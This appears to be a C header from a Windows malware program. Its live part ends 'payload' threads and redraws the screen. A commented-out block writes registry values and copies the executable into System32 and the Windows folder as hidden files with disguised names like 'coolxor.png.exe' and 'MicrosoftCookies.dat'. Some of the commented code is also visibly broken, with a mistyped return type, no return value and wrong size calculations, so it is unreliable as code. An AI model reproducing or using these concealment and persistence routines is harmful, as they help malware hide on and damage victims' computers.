typedef struct IUnknown IUnknown;
#pragma once

#include "mif.h"

/*FLONG WINAPI ManageRegW(HKEY hKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, DWORD dwType, BYTE lpData, LPBYTE lpData2, bool isSet, bool isString) {
    HKEY hkResult;
    if (isSet == false) {
        if (isString == false) {
            RegCreateKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
        }
        else if (isString == true) {
            RegCreateKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
        }
    }
    else if (isSet == true) {
        if (isString == false) {
            RegOpenKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, dwType, &lpData, sizeof(lpData));
        }
        else if (isString == true) {
            RegOpenKeyW(hKey, lpSubKey, &hkResult);
            RegSetValueExW(hkResult, lpValueName, 0, REG_SZ, lpData2, sizeof(lpData2) * 16);
        }
    }
} 

void CopyMalwareFile(void) {
	SetCopiedFileAttributes(GetDir(), L"C:\\WINDOWS\\System32\\mif.exe", FILE_ATTRIBUTE_HIDDEN, true);
	SetCopiedFileAttributes(GetDir(), L"C:\\WINDOWS\\System32\\oobe\\images\\coolxor.png.exe", FILE_ATTRIBUTE_HIDDEN, true);
	SetCopiedFileAttributes(GetDir(), L"C:\\WINDOWS\\winboot.dat", FILE_ATTRIBUTE_HIDDEN, true);
	SetCopiedFileAttributes(GetDir(), L"C:\\WINDOWS\\System32\\MicrosoftCookies.dat", FILE_ATTRIBUTE_HIDDEN, true);
}*/

void EndPayload(HANDLE hThread) {
	TerminateThread(hThread, 0);
	CloseHandle(hThread);

}

void RedrawScreen(void) {
	RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE|RDW_ERASE|RDW_ALLCHILDREN);
}
